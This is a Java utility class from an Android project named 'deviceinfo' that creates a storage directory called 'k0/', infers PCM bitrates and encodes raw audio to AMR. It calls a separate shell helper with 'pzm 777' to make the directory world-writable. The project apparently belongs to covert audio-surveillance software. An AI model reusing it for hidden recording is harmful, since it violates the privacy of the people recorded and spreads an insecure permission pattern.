package com.android.deviceinfo.util;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Date;

import android.media.AmrInputStream;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.resample.Resample;
import com.musicg.wave.Wave;
import com.musicg.wave.WaveHeader;

public class AudioEncoding {
	private static final String TAG = "AudioEncoding";
	private static String audioDirectory = "k0/";
	private static String audioStorage;
	
	static public boolean createAudioStorage() {
		// Create storage directory
		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;

		if (Path.createDirectory(audioStorage) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createAudioStorage): audio storage directory cannot be created"); //$NON-NLS-1$
			}

			return false;
		} else {
			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "777" + " " + audioStorage);
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
			}

			return true;
		}
	}
	
	static public int getBitrate(int delta, int data_size) {
		float min = Float.MAX_VALUE;
		int bitrates[] = {8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 176400, 192000, 352800, 384000};
		int calc = -1;
		
		if (delta <= 0 || data_size <= 0) {
			return -1;
		}
		
		int bitrate = (data_size / 2) / delta; // 16-bit PCM
		
		// Calculate the closest possible real value, yep it can be optimized:
		// if t > min: return prev_bitrate
		for (int b : bitrates) {
			float t = (float)bitrate / (float)b;
			
			t = Math.abs(1.0f - t);
			
			if (t < min) {
				calc = b;
				min = t;
			}
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + "(getBitrate): bitrate declared: " + bitrate + " bitrate inferred: " + calc);
		}
		
		return calc;
	}
	
	static public boolean encodetoAmr(String outFile, byte[] raw) {
	    File file = new File(outFile);
	    
	    try {		
	    	InputStream inStream = new ByteArrayInputStream(raw);
	    	AmrInputStream aStream = new AmrInputStream(inStream);
	    	
	    	file.createNewFile();
			
		    OutputStream out = new FileOutputStream(file); 
			
		    out.write(0x23);
		    out.write(0x21);
		    out.write(0x41);
		    out.write(0x4D);
		    out.write(0x52);
		    out.write(0x0A);    
		
		    byte[] buf = new byte[4096];
		    int len;
		    
		    while ((len = aStream.read(buf)) > 0) {
		        out.write(buf, 0, len);
		    }
		
		    out.close();
		    aStream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
			
			return false;
		}
	    
	    return true;
	}
	
	static public String getAudioStorage() {
		return audioStorage;
	}
}
